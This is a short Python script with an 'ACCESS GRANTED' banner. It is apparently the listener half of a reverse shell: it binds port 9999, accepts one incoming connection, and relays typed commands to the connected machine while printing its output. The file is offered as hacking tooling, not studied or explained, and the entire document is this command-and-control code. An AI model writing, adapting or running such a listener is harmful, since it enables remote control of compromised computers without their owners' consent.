import os
import socket
import sys

print("""
 █████╗  ██████╗ ██████╗███████╗███████╗███████╗     ██████╗ ██████╗  █████╗ ███╗   ██╗████████╗███████╗██████╗ 
██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
███████║██║     ██║     ███████╗█████╗  ███████╗    ██║  ███╗██████╔╝███████║██╔██╗ ██║   ██║   █████╗  ██║  ██║
██╔══██║██║     ██║     ╚════██║██╔══╝  ╚════██║    ██║   ██║██╔══██╗██╔══██║██║╚██╗██║   ██║   ██╔══╝  ██║  ██║
██║  ██║╚██████╗╚██████╗███████║███████╗███████║    ╚██████╔╝██║  ██║██║  ██║██║ ╚████║   ██║   ███████╗██████╔╝
╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═════╝
""")

def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("[-] Error has occured" + str(msg))

def socket_bind():
    try:
        global host
        global port
        global s
        print("[+] Binding socket to port " + str(port) + "\n[+] Listining:")
        s.bind((host, port))
        s.listen(5)
    except socket.socket as msg:
        print("[-] Error has occured" + str(msg))
        socket_bind()

def cmd(conn):
    while True:
        while True:
            cmd1 = input(os.getcwd() + "> ")
            if cmd1 == "quit":
                print("Connection closed")
                conn.send(str.encode(cmd1))
                conn.close()
                s.close()
                sys.exit()
            if len(str.encode(cmd1)) > 0:
                conn.send(str.encode(cmd1))
                client_responce = str(conn.recv(1024), "utf-8")
                print(client_responce, end="")
            if cmd1 == "help":
                print("help - prints this help message")


def socket_accept():
    conn, add = s.accept()
    print(f"Connection from {add} established")
    cmd(conn)
    conn.close()

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()
